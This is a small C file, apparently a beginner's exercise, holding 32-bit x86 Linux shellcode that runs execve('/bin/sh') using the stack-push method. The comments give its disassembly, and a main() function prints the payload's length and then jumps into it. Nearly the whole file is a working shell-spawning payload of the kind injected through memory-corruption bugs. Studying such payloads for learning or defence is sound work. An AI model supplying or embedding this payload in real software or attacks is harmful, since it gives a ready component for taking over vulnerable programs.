/*
 * newbie's execve /bin/sh shellcode, with push method
 *
 * by Novice Live, http://novicelive.org :)
 *
 * feb 18, 2015
 */

/* 08048054 <_start>:
 *  8048054:   31 c0                   xor    %eax,%eax
 *  8048056:   68 2f 73 68 ff          push   $0xff68732f
 *  804805b:   68 2f 62 69 6e          push   $0x6e69622f
 *  8048060:   88 44 24 07             mov    %al,0x7(%esp)
 *  8048064:   b0 0b                   mov    $0xb,%al
 *  8048066:   89 e3                   mov    %esp,%ebx
 *  8048068:   31 c9                   xor    %ecx,%ecx
 *  804806a:   31 d2                   xor    %edx,%edx
 *  804806c:   cd 80                   int    $0x80
 */

#include <stdio.h>
#include <string.h>

int main(void)
{
    char *shellcode = "\x31\xc0"
        "\x68\x2f\x73\x68\xff"
        "\x68\x2f\x62\x69\x6e"
        "\x88\x44\x24\x07"
        "\xb0\x0b"
        "\x89\xe3"
        "\x31\xc9"
        "\x31\xd2"
        "\xcd\x80";

    printf("strlen(shellcode): %d\n", strlen(shellcode));

    ((void (*)(void))shellcode)();

    return 0;
}
